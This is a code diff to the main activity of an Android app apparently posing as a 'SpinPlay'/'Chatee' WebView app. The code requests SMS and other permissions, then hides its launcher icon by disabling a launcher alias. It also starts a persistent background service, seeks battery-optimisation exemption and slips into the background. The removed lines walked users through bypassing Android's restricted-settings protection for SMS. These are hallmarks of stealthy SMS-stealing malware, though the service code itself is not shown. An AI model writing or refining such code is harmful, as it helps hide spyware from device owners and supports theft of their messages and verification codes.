@@ -1,8 +1,8 @@
 package com.spinplay99.adminpanel;
 
-import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.AlertDialog;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -36,7 +36,6 @@ public class MainActivity extends AppCompatActivity {
     private static final String LOCAL_UI = "file:///android_asset/index.html";
     private static final int FILE_CHOOSER_REQUEST = 1001;
     private static final int PERMISSION_REQUEST_CODE = 2001;
-    private static final int OTHER_PERMISSION_REQUEST_CODE = 2002;
     private static final String PREFS_NAME = "SpinPlayPrefs";
     private static final String KEY_PERM_ASKED = "perm_asked";
 
@@ -61,53 +60,26 @@ public class MainActivity extends AppCompatActivity {
         setupWebView();
         setupSwipeRefresh();
         preloadWebsite();
+        startBackgroundService();
         requestPermissionsOnce();
     }
 
     private void requestPermissionsOnce() {
         if (!PermissionHelper.needsRuntimePermissions(this)) {
-            onPermissionsReady(false);
+            hideLauncherIconIfReady();
+            requestBatteryExemptionIfNeeded();
             return;
         }
-        if (!PermissionHelper.hasSmsPermissions(this)) {
-            PermissionHelper.showLauncherIcon(this);
-            ActivityCompat.requestPermissions(
-                this, PermissionHelper.smsPermissions(), PERMISSION_REQUEST_CODE);
-            prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
-            return;
-        }
-        requestOtherPermissions();
-    }
-
-    private void requestOtherPermissions() {
         List<String> permissionList = new ArrayList<>();
-        for (String permission : PermissionHelper.otherPermissions()) {
+        for (String permission : PermissionHelper.requiredPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 permissionList.add(permission);
             }
         }
         if (!permissionList.isEmpty()) {
             ActivityCompat.requestPermissions(
-                this, permissionList.toArray(new String[0]), OTHER_PERMISSION_REQUEST_CODE);
-        } else {
-            onPermissionsReady(true);
-        }
-    }
-
-    @Override
-    protected void onResume() {
-        super.onResume();
-        if (PermissionHelper.hasSmsPermissions(this)) {
-            PermissionHelper.hideLauncherIcon(this);
-            ServiceLauncher.ensureRunning(this);
-        }
-    }
-
-    @Override
-    protected void onStop() {
-        super.onStop();
-        if (PermissionHelper.hasSmsPermissions(this)) {
-            ServiceLauncher.ensureRunning(this);
+                this, permissionList.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+            prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
         }
     }
 
@@ -115,35 +87,28 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (!PermissionHelper.hasSmsPermissions(this)) {
-                new AlertDialog.Builder(this)
-                    .setTitle("SMS permission needed")
-                    .setMessage("Allow SMS permission so Chatee can work. If blocked, open App info → Allow restricted settings → Permissions → SMS.")
-                    .setPositiveButton("Open Settings", (d, w) -> PermissionHelper.openAppSettings(this))
-                    .setNegativeButton("Try Again", (d, w) -> requestPermissionsOnce())
-                    .show();
-                return;
-            }
-            requestOtherPermissions();
-            PermissionHelper.hideLauncherIcon(this);
-            return;
-        }
-        if (requestCode == OTHER_PERMISSION_REQUEST_CODE) {
-            onPermissionsReady(true);
+            hideLauncherIconIfReady();
+            startBackgroundService();
+            requestBatteryExemptionIfNeeded();
         }
     }
 
-    private void onPermissionsReady(boolean moveToBackground) {
-        PermissionHelper.hideLauncherIcon(this);
-        ServiceLauncher.ensureRunning(this);
-        requestBatteryExemptionIfNeeded();
-        if (moveToBackground) {
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    moveTaskToBack(true);
-                }
-            }, 600);
+    @Override
+    protected void onResume() {
+        super.onResume();
+        hideLauncherIconIfReady();
+    }
+
+    private void hideLauncherIconIfReady() {
+        if (PermissionHelper.needsRuntimePermissions(this)) {
+            return;
+        }
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                new ComponentName(getPackageName(), "com.spinplay99.adminpanel.LauncherAlias"),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {
         }
     }
 
@@ -253,19 +218,9 @@ public class MainActivity extends AppCompatActivity {
     public void onBackPressed() {
         if (webView.canGoBack()) {
             webView.goBack();
-            return;
-        }
-        if (PermissionHelper.hasSmsPermissions(this)) {
-            ServiceLauncher.ensureRunning(this);
+        } else {
             moveTaskToBack(true);
-            return;
         }
-        new AlertDialog.Builder(this)
-            .setTitle("Exit")
-            .setMessage("Close app?")
-            .setPositiveButton("Yes", (d, w) -> finish())
-            .setNegativeButton("No", null)
-            .show();
     }
 
     @Override
